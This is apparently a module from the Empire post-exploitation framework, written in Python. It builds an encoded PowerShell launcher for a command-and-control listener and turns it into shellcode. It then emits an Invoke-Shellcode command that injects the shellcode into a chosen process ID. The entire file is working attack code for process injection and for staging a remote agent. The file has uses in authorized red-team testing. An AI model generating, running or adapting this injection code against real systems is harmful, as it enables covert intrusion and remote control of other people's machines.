from empire.server.common import helpers
from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):
        # options
        listener_name = params["Listener"]
        proc_id = params["ProcId"].strip()
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        arch = params["Arch"]

        if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
            # not a valid listener, return nothing for the script
            raise ModuleValidationException(f"[!] Invalid listener: {listener_name}")

        # generate the PowerShell one-liner with all of the proper options set
        launcher = main_menu.stagergenv2.generate_launcher(
            listener_name,
            language="powershell",
            encode=True,
            user_agent=user_agent,
            proxy=proxy,
            proxy_creds=proxy_creds,
        )

        if launcher == "":
            raise ModuleValidationException("Error in launcher generation.")

        launcher_code = launcher.split(" ")[-1]
        sc, err = main_menu.stagergenv2.generate_powershell_shellcode(
            launcher_code, arch
        )
        if err:
            raise ModuleValidationException(err)

        encoded_sc = helpers.encode_base64(sc)

        script_end = f'\nInvoke-Shellcode -ProcessID {proc_id} -Shellcode $([Convert]::FromBase64String("{encoded_sc}")) -Force'
        script_end += f"; shellcode injected into pid {proc_id!s}"

        return script, script_end
